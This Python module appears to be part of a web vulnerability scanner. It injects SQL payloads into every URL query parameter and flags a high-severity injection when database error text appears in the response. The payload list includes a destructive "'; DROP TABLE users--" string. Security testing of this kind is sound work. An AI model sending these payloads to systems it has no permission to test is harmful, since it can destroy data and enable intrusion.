from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils.http import get

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users--"
]

SQL_ERRORS = [
    "sql syntax",
    "mysql",
    "sqlite",
    "syntax error",
    "database error"
]


def inject_payload(url, payload):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        return None

    injected_params = {}

    for key in params:
        injected_params[key] = payload

    new_query = urlencode(injected_params, doseq=True)

    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))


def test_sqli(url):
    for payload in SQL_PAYLOADS:
        injected_url = inject_payload(url, payload)

        if not injected_url:
            continue

        response = get(injected_url)

        if response:
            body = response.text.lower()

            for error in SQL_ERRORS:
                if error in body:
                    return {
                        "type": "SQL Injection",
                        "url": url,
                        "tested_url": injected_url,
                        "severity": "HIGH",
                        "payload": payload
                    }

    return None